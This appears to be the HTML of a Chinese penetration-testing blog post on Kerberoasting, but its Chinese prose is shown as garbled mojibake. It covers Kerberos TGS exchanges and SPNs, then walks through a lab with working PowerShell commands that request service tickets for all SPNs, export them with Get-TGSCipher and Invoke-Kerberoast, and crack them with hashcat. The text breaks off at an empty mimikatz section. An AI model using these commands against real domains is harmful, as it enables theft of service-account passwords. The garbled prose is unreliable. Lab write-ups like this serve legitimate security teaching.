&lt;p&gt;Kerberoasting æ˜¯åŸŸæ¸—é€ä¸­ç»å¸¸ä½¿ç”¨çš„ä¸€é¡¹æŠ€æœ¯ï¼Œæ˜¯Tim Medin åœ¨ DerbyCon 2014 ä¸Šå‘å¸ƒçš„ä¸€ç§åŸŸå£ä»¤æ”»å‡»æ–¹æ³•ï¼ŒTim Medin åŒæ—¶å‘å¸ƒäº†é…å¥—çš„æ”»å‡»å·¥å…· kerberoastã€‚æ­¤åï¼Œä¸å°‘ç ”ç©¶äººå‘˜å¯¹ Kerberoasting è¿›è¡Œäº†æ”¹è¿›å’Œæ‰©å±•ï¼Œåœ¨ GitHub ä¸Šå¼€å‘å‘å¸ƒäº†å¤§é‡å·¥å…·ï¼Œä½¿å¾— Kerberoasting é€æ¸å‘å±•æˆä¸ºåŸŸæ”»å‡»çš„å¸¸ç”¨æ–¹æ³•ä¹‹ä¸€ã€‚&lt;/p&gt;
&lt;p&gt;Kerberoastæ”»å‡»æ˜¯åœ¨TGS_REPçš„è¿‡ç¨‹ä¸­ç”¨æˆ·å°†ä¼šæ”¶åˆ°ç”±ç›®æ ‡æœåŠ¡å®ä¾‹çš„NTLM hashåŠ å¯†ç”Ÿæˆçš„ST(service ticket)ï¼ŒåŠ å¯†ç®—æ³•ä¸ºRC4-HMACï¼Œå¦‚æœè·å¾—è¿™ä¸ªSTç¥¨æ®ï¼Œæˆ‘ä»¬å¯ä»¥å°è¯•ç©·ä¸¾å£ä»¤ï¼Œæ¨¡æ‹ŸåŠ å¯†è¿‡ç¨‹ï¼Œè¿›è¡Œç ´è§£ã€‚&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Kerberoastingå’ŒKerberoastæ˜¯åŒä¸€ç§æŠ€æœ¯ï¼Œå«æ³•ä¸ä¸€æ ·&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=&#34;0x01-åŸºç¡€æ¦‚å¿µ&#34;&gt;0x01 åŸºç¡€æ¦‚å¿µ&lt;/h1&gt;
&lt;p&gt;åœ¨ä¹‹å‰çš„ä¸€ékerberosè®¤è¯ä¸­æœ‰ä»‹ç»è¿‡TGSè®¤è¯çš„è¯¦ç»†è¿‡ç¨‹ï¼Œå¤§å®¶å¯ä»¥å…ˆå»é˜…è§ˆä¸€ç•ªï¼š&lt;a href=&#34;https://xxe.icu/posts/kerberos_authentication/&#34;&gt;åŸŸæ¸—é€-Kerberosè®¤è¯&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;æˆ‘ä»¬å…ˆçŸ¥é“ä¸‹é¢ä¸€äº›åç§°çš„ç”¨é€”ï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;KDCï¼ˆKey Distribution Centerï¼‰= å¯†é’¥åˆ†å‘ä¸­å¿ƒ&lt;/li&gt;
&lt;li&gt;ASï¼ˆAuthentication Serviceï¼‰= è®¤è¯ç”¨æˆ·çš„èº«ä»½ï¼Œå¹¶ä¸ºå…¶å‘æ”¾TGTçš„æœåŠ¡&lt;/li&gt;
&lt;li&gt;TGTï¼ˆTicket Granting Ticketï¼‰= TGTè®¤è¯ç¥¨æ®ï¼Œç”±ASæœåŠ¡å‘æ”¾&lt;/li&gt;
&lt;li&gt;TGSï¼ˆTicket Granting Serviceï¼‰= ç¥¨æ®å‘æ”¾æœåŠ¡&lt;/li&gt;
&lt;li&gt;STï¼ˆService Ticketsï¼‰= STæœåŠ¡ç¥¨æ®ï¼Œç”±TGSæœåŠ¡å‘é€&lt;/li&gt;
&lt;li&gt;APï¼ˆApplication Serverï¼‰= æä¾›ç”¨æˆ·æ‰€éœ€çš„æœåŠ¡&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;kerberosè®¤è¯&#34;&gt;kerberosè®¤è¯&lt;/h2&gt;
&lt;p&gt;æ”»å‡»å‘é€åœ¨TGSè®¤è¯çš„é˜¶æ®µï¼Œé¦–å…ˆæˆ‘ä»¬è¦çŸ¥é“è¿™ä¸ªæ”»å‡»åªè¦åœ¨åŸŸç”¨æˆ·çš„æƒé™ä¸‹éƒ½å¯ä»¥å‘é€TGSè¯·æ±‚ã€‚&lt;/p&gt;
&lt;h3 id=&#34;tgs_req&#34;&gt;TGS_REQ&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;ç»è¿‡AS_REPçš„æ­¥éª¤ï¼Œå®¢æˆ·ç«¯è·å¾—äº† TGTç¥¨æ® å’Œ Login Session Keyã€‚&lt;/li&gt;
&lt;li&gt;ç”¨è‡ªå·±çš„å¯†ç NTLM Hashè§£å¯†Login Session Keyå¾—åˆ°åŸå§‹çš„Logon Session Keyã€‚&lt;/li&gt;
&lt;li&gt;å®ƒä¼šåœ¨æœ¬åœ°ç¼“å­˜æ­¤ TGTç¥¨æ®å’Œ åŸå§‹çš„Login Session Keyã€‚å¦‚æœç°åœ¨å®ƒéœ€è¦è®¿é—®æŸå°æœåŠ¡å™¨çš„æŸä¸ªæœåŠ¡ï¼Œå®ƒå°±éœ€è¦å‡­å€Ÿè¿™å¼ TGTç¥¨æ®å‘KDCç”³è¯·ç›¸åº”çš„STæœåŠ¡ç¥¨æ®ï¼ˆService Ticketï¼‰ã€‚&lt;/li&gt;
&lt;li&gt;STæœåŠ¡ç¥¨æ®æ˜¯é€šè¿‡KDCçš„ TGSæœåŠ¡é¢å‘çš„ã€‚&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;tgs_rep&#34;&gt;TGS_REP&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;TGSæ¥æ”¶åˆ°è¯·æ±‚ä¹‹åï¼Œé¦–å…ˆä¼šæ£€æŸ¥è‡ªèº«æ˜¯å¦å­˜åœ¨å®¢æˆ·ç«¯æ‰€è¯·æ±‚çš„æœåŠ¡ï¼ˆå°±æ˜¯æŸ¥è¯¢SPNï¼‰ã€‚&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;å¦‚æœæœåŠ¡å­˜åœ¨ï¼Œåˆ™é€šè¿‡ krbtgt ç”¨æˆ·çš„NTLM Hash è§£å¯†TGTå¹¶å¾—åˆ°Login Session Keyï¼Œç„¶åé€šè¿‡Login Session Keyè§£å¯†Authenticatorã€‚&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;å¦‚æœè§£å¯†æˆåŠŸï¼Œåˆ™éªŒè¯äº†å¯¹æ–¹çš„çœŸå®èº«ä»½ï¼ŒåŒæ—¶è¿˜ä¼šéªŒè¯æ—¶é—´æˆ³æ˜¯å¦åœ¨èŒƒå›´å†…ã€‚å¹¶ä¸”è¿˜ä¼šæ£€æŸ¥TGTä¸­çš„æ—¶é—´æˆ³æ˜¯å¦è¿‡æœŸï¼Œä¸”åŸå§‹åœ°å€æ˜¯å¦å’ŒTGTä¸­ä¿å­˜çš„åœ°å€ç›¸åŒã€‚&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;åœ¨å®Œæˆä¸Šè¿°çš„æ£€æµ‹åï¼Œå¦‚æœéªŒè¯é€šè¿‡ï¼Œåˆ™TGSå®Œæˆäº†å¯¹å®¢æˆ·ç«¯çš„è®¤è¯ï¼Œä¼šç”Ÿæˆä¸€ä¸ªç”¨Logon Session KeyåŠ å¯†åçš„ç”¨äºç¡®ä¿å®¢æˆ·ç«¯-æœåŠ¡å™¨ä¹‹é—´é€šä¿¡å®‰å…¨çš„Service Session Keyä¼šè¯ç§˜é’¥(ä¹Ÿå°±æ˜¯æœ€å¤–å±‚enc-partéƒ¨åˆ†)ï¼Œå¹¶ä¸”ä¼šä¸ºè¯¥å®¢æˆ·ç«¯ç”ŸæˆSTæœåŠ¡ç¥¨æ®ã€‚&lt;/p&gt;
&lt;p&gt;STæœåŠ¡ç¥¨æ®ä¸»è¦åŒ…å«ä¸¤æ–¹é¢çš„å†…å®¹ï¼šå®¢æˆ·ç«¯ç”¨æˆ·ä¿¡æ¯å’ŒåŸå§‹Service Session Keyï¼Œæ•´ä¸ªSTæœåŠ¡ç¥¨æ®ç”¨è¯¥æœåŠ¡çš„NTLM Hashè¿›è¡ŒåŠ å¯†ã€‚&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;æœ€ç»ˆService Session Key å’Œ STæœåŠ¡ç¥¨æ® å‘é€ç»™å®¢æˆ·ç«¯ã€‚(è¿™ä¸€æ­¥ä¸ç®¡ç”¨æˆ·æœ‰æ²¡æœ‰è®¿é—®æœåŠ¡çš„æƒé™ï¼Œåªè¦TGTæ­£ç¡®ï¼Œå°±éƒ½ä¼šè¿”å›STæœåŠ¡ç¥¨æ®ï¼Œè¿™ä¹Ÿæ˜¯kerberoastingèƒ½åˆ©ç”¨çš„åŸå› ï¼Œä»»ä½•ä¸€ä¸ªç”¨æˆ·ï¼Œåªè¦hashæ­£ç¡®ï¼Œå°±å¯ä»¥è¯·æ±‚åŸŸå†…ä»»ä½•ä¸€ä¸ªæœåŠ¡çš„STç¥¨æ®)&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;spnä»‹ç»&#34;&gt;SPNä»‹ç»&lt;/h2&gt;
&lt;p&gt;æœåŠ¡ä¸»ä½“åç§°ï¼ˆSPNï¼šServicePrincipal Namesï¼‰æ˜¯æœåŠ¡å®ä¾‹ï¼ˆå¯ä»¥ç†è§£ä¸ºä¸€ä¸ªæœåŠ¡ï¼Œæ¯”å¦‚ HTTPã€MSSQLï¼‰çš„å”¯ä¸€æ ‡è¯†ç¬¦ã€‚Kerberos èº«ä»½éªŒè¯ä½¿ç”¨ SPN å°†æœåŠ¡å®ä¾‹ä¸æœåŠ¡ç™»å½•å¸æˆ·ç›¸å…³è”ã€‚å¦‚æœåœ¨æ•´ä¸ªæ—æˆ–åŸŸä¸­çš„è®¡ç®—æœºä¸Šå®‰è£…å¤šä¸ªæœåŠ¡å®ä¾‹ï¼Œåˆ™æ¯ä¸ªå®ä¾‹éƒ½å¿…é¡»å…·æœ‰è‡ªå·±çš„ SPNã€‚å¦‚æœå®¢æˆ·ç«¯å¯èƒ½ä½¿ç”¨å¤šä¸ªåç§°è¿›è¡Œèº«ä»½éªŒè¯ï¼Œåˆ™ç»™å®šæœåŠ¡å®ä¾‹å¯ä»¥å…·æœ‰å¤šä¸ª SPNã€‚SPN å§‹ç»ˆåŒ…å«è¿è¡ŒæœåŠ¡å®ä¾‹çš„ä¸»æœºçš„åç§°ï¼Œå› æ­¤æœåŠ¡å®ä¾‹å¯ä»¥ä¸ºå…¶ä¸»æœºçš„æ¯ä¸ªåç§°æˆ–åˆ«åæ³¨å†Œ SPNã€‚&lt;/p&gt;
&lt;p&gt;å½“æŸç”¨æˆ·éœ€è¦è®¿é—®MySQLæœåŠ¡æ—¶ï¼Œç³»ç»Ÿä¼šä»¥å½“å‰ç”¨æˆ·çš„èº«ä»½å‘åŸŸæ§æŸ¥è¯¢SPNä¸ºMySQLçš„è®°å½•ã€‚å½“æ‰¾åˆ°è¯¥SPNè®°å½•åï¼Œç”¨æˆ·ä¼šå†æ¬¡ä¸KDCé€šä¿¡ï¼Œå°†KDCå‘æ”¾çš„TGTä½œä¸ºèº«ä»½å‡­æ®å‘é€ç»™å®¢æˆ·ï¼Œå¹¶å°†éœ€è¦è®¿é—®çš„SPNå‘é€ç»™KDCã€‚&lt;/p&gt;
&lt;p&gt;KDCä¸­çš„TGSæœåŠ¡å¯¹TGTè¿›è¡Œè§£å¯†ã€‚ç¡®è®¤æ— è¯¯åï¼Œç”±TGSå°†ä¸€å¼ å…è®¸è®¿é—®è¯¥SPNæ‰€å¯¹åº”çš„æœåŠ¡çš„STæœåŠ¡ç¥¨æ®å’Œè¯¥SPNæ‰€å¯¹åº”çš„æœåŠ¡çš„åœ°å€å‘é€ç»™ç”¨æˆ·ï¼Œç”¨æˆ·ä½¿ç”¨è¯¥ç¥¨æ®å³å¯è®¿é—®MySQLæœåŠ¡ã€‚&lt;/p&gt;
&lt;p&gt;ç›¸å…³è¯¦ç»†çš„æ–‡ç« å¯ä»¥æŸ¥çœ‹å¦å¤–ä¸€éæ–‡ç« &lt;a href=&#34;https://xxe.icu/posts/ad_spn/&#34;&gt;åŸŸæ¸—é€-SPN&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;æ”»å‡»åŸç†&#34;&gt;æ”»å‡»åŸç†&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;æ”»å‡»è€…å¯¹ä¸€ä¸ªåŸŸè¿›è¡Œèº«ä»½éªŒè¯ï¼Œç„¶åä»åŸŸæ§åˆ¶å™¨è·å¾—ä¸€ä¸ªTGTè®¤è´­æƒè¯ï¼Œè¯¥TGTè®¤è´­æƒè¯ç”¨äºä»¥åçš„STæœåŠ¡ç¥¨æ®è¯·æ±‚ã€‚&lt;/li&gt;
&lt;li&gt;æ”»å‡»è€…ä½¿ç”¨ä»–ä»¬çš„ TGTè®¤è´­æƒè¯ å‘å‡ºSTæœåŠ¡ç¥¨æ®è¯·æ±‚(TGS-REQ) è·å–ç‰¹å®šæ ‡è¯†çš„SPNã€‚æ­¤SPNåœ¨åŸŸä¸­åº”è¯¥æ˜¯å”¯ä¸€çš„ï¼Œå¹¶ä¸”åœ¨ç”¨æˆ·æˆ–è®¡ç®—æœºå¸æˆ·çš„servicePrincipalName å­—æ®µä¸­æ³¨å†Œã€‚åœ¨æœåŠ¡ç¥¨è¯è¯·æ±‚(TGS-REQ)è¿‡ç¨‹ä¸­ï¼Œæ”»å‡»è€…å¯ä»¥æŒ‡å®šå®ƒä»¬æ”¯æŒçš„KerberosåŠ å¯†ç±»å‹(RC4_HMACï¼ŒAES256_CTS_HMAC_SHA1_96ç­‰ç­‰)ã€‚&lt;/li&gt;
&lt;li&gt;å¦‚æœæ”»å‡»è€…çš„ TGT æ˜¯æœ‰æ•ˆçš„ï¼Œåˆ™ DC å°†ä»TGTè®¤è´­æƒè¯ä¸­æå–ä¿¡æ¯å¹¶å¡«å……åˆ°STæœåŠ¡ç¥¨æ®ä¸­ã€‚ç„¶åï¼ŒåŸŸæ§åˆ¶å™¨æŸ¥æ‰¾å“ªä¸ªå¸æˆ·åœ¨ServicedPrincipalName å­—æ®µä¸­æ³¨å†Œäº†æ‰€è¯·æ±‚çš„ SPNã€‚STæœåŠ¡ç¥¨æ®ä½¿ç”¨æ³¨å†Œäº†æ‰€è¦æ±‚çš„ SPN çš„å¸æˆ·çš„NTLMå“ˆå¸Œè¿›è¡ŒåŠ å¯†,å¹¶ä½¿ç”¨æ”»å‡»è€…å’ŒæœåŠ¡å¸æˆ·å…±åŒå•†å®šçš„åŠ å¯†ç®—æ³•ã€‚STæœåŠ¡ç¥¨æ®ä»¥æœåŠ¡ç¥¨æ®å›å¤(TGS-REP)çš„å½¢å¼å‘é€å›æ”»å‡»è€…ã€‚&lt;/li&gt;
&lt;li&gt;æ”»å‡»è€…ä» TGS-REP ä¸­æå–åŠ å¯†çš„æœåŠ¡ç¥¨è¯ã€‚ç”±äºæœåŠ¡ç¥¨è¯æ˜¯ç”¨é“¾æ¥åˆ°è¯·æ±‚ SPN çš„å¸æˆ·çš„å“ˆå¸ŒåŠ å¯†çš„ï¼Œæ‰€ä»¥æ”»å‡»è€…å¯ä»¥ç¦»çº¿ç ´è§£è¿™ä¸ªåŠ å¯†å—ï¼Œæ¢å¤å¸æˆ·çš„æ˜æ–‡å¯†ç ã€‚&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&#34;0x02-å®æˆ˜&#34;&gt;0x02 å®æˆ˜&lt;/h1&gt;
&lt;p&gt;åˆ©ç”¨æ­¥éª¤ï¼š&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;æŸ¥è¯¢SPNï¼Œæ‰¾åˆ°æœ‰ä»·å€¼çš„SPNï¼Œéœ€è¦æ»¡è¶³ä»¥ä¸‹æ¡ä»¶ï¼š
&lt;ul&gt;
&lt;li&gt;è¯¥SPNæ³¨å†Œåœ¨åŸŸç”¨æˆ·å¸æˆ·(Users)ä¸‹&lt;/li&gt;
&lt;li&gt;åŸŸç”¨æˆ·è´¦æˆ·çš„æƒé™å¾ˆé«˜&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;è¯·æ±‚TGS&lt;/li&gt;
&lt;li&gt;å¯¼å‡ºTGS&lt;/li&gt;
&lt;li&gt;æš´åŠ›ç ´è§£&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;ç¯å¢ƒ&#34;&gt;ç¯å¢ƒ&lt;/h2&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;ä¸»æœºåç§°&lt;/th&gt;
&lt;th style=&#34;text-align:left&#34;&gt;IPåœ°å€&lt;/th&gt;
&lt;th&gt;æ‰€åœ¨åŸŸ&lt;/th&gt;
&lt;th&gt;ä½œç”¨&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;DC&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;172.16.0.106&lt;/td&gt;
&lt;td&gt;hack.lab&lt;/td&gt;
&lt;td&gt;æä¾›SPNæœåŠ¡å’Œkerberosè®¤è¯&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;SQL&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;172.16.0.111&lt;/td&gt;
&lt;td&gt;hack.lab&lt;/td&gt;
&lt;td&gt;æä¾›SQL ServeræœåŠ¡&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;WIN7A&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;172.16.0.105&lt;/td&gt;
&lt;td&gt;hack.lab&lt;/td&gt;
&lt;td&gt;æ”»å‡»è€…æ‹¿åˆ°çš„æƒé™ä¸»æœº&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Kali Linux&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;172.16.0.107&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;æ”»å‡»è€…&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;æ–¹æ³•ä¸€psè„šæœ¬&#34;&gt;æ–¹æ³•ä¸€ï¼ˆPSè„šæœ¬ï¼‰&lt;/h2&gt;
&lt;p&gt;é¦–å…ˆæ˜¯åœ¨ä¸»æœºWIN7Aä¸Šé¢çš„æ™®é€šåŸŸç”¨æˆ·è¿›è¡Œæ“ä½œï¼Œä½¿ç”¨powershellè¿›è¡Œæ“ä½œï¼Œä¸‹é¢æ˜¯è¯·æ±‚SPNä¸­æ‰€æœ‰çš„TGSï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;Add-Type&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-AssemblyName&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;System&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;IdentityModel&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;setspn&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;exe&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-q&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;*/*&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;Select-String&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;^CN&amp;#39;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Context&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;%&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;New-Object&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;System&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;IdentityModel&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;Tokens&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;KerberosRequestorSecurityToken&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-ArgumentList&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$_&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;Context&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;PostContext&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;].&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;Trim&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å¦‚ä¸‹å›¾ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/kerberoasting/1.png&#34; alt=&#34;1&#34;&gt;&lt;/p&gt;
&lt;p&gt;å¦‚æœæƒ³è¯·æ±‚å•ä¸ªæœåŠ¡å¯ä»¥ç”¨ä¸‹é¢çš„å‘½ä»¤ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;Add-Type&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-AssemblyName&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;System&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;IdentityModel&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;New-Object&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;System&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;IdentityModel&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;Tokens&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;KerberosRequestorSecurityToken&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-ArgumentList&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;MSSQLSvc/SQL.hack.lab:1433&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Kerberos åè®®ä¸­è¯·æ±‚çš„ç¥¨æ®ä¼šä¿å­˜åœ¨å†…å­˜ä¸­ï¼Œå¯ä»¥é€šè¿‡ &lt;code&gt;klist&lt;/code&gt; å‘½ä»¤æŸ¥çœ‹å½“å‰ä¼šè¯å­˜å‚¨çš„ kerberos ç¥¨æ®:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/kerberoasting/2.png&#34; alt=&#34;2&#34;&gt;&lt;/p&gt;
&lt;p&gt;æ¥ç€æˆ‘ä»¬ä½¿ç”¨RiskySPNå·¥å…·åŒ…ä¸­çš„&lt;a href=&#34;https://github.com/cyberark/RiskySPN/blob/master/Get-TGSCipher.ps1&#34;&gt;Get-TGSCipher.ps1&lt;/a&gt;è„šæœ¬æ¥è¿›è¡Œå¯¼å‡ºï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;Import-Module&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;.\&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;Get-TGSCipher&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;ps1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;Get-TGSCipher&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-SPN&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;MSSQLSvc/SQL.hack.lab:1433&amp;#34;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Format&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Hashcat&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote&gt;
&lt;p&gt;å¦‚æœæƒ³è¦ç”¨Johnï¼Œæ”¹æˆ-Format Johnå³å¯&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/kerberoasting/6.png&#34; alt=&#34;6&#34;&gt;&lt;/p&gt;
&lt;p&gt;ç„¶åæŠŠè¿™ä¸²å­—ç¬¦æ”¾åˆ°hashcatè¿›è¡Œç ´è§£å°±å®Œäº‹äº†ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;hashcat -m &lt;span class=&#34;m&#34;&gt;13100&lt;/span&gt; hash.txt passwd.txt
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/kerberoasting/7.png&#34; alt=&#34;7&#34;&gt;&lt;/p&gt;
&lt;p&gt;å› ä¸ºè¦åšmimikatzçš„å…æ€ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨powershellçš„è„šæœ¬ï¼Œè¿™æ˜¯æ¥è‡ªäºEmpireæ¡†æ¶ä¸­çš„&lt;a href=&#34;https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-Kerberoast.ps1&#34;&gt;Invoke-Kerberoast.ps1&lt;/a&gt;ã€‚&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;Import-Module&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;.\&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;Invoke-kerberoast&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;ps1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;Invoke-kerberoast&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-OutputFormat&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Hashcat&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ç»“æœå¦‚ä¸‹å›¾ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/kerberoasting/9.png&#34; alt=&#34;9&#34;&gt;&lt;/p&gt;
&lt;p&gt;åŒä¸Šæ”¾åˆ°hashcatç ´è§£å³å¯ã€‚&lt;/p&gt;
&lt;h2 id=&#34;æ–¹æ³•äºŒmimikatz&#34;&gt;æ–¹æ³•äºŒï¼ˆmimikatzï¼‰&lt;/h2&gt;
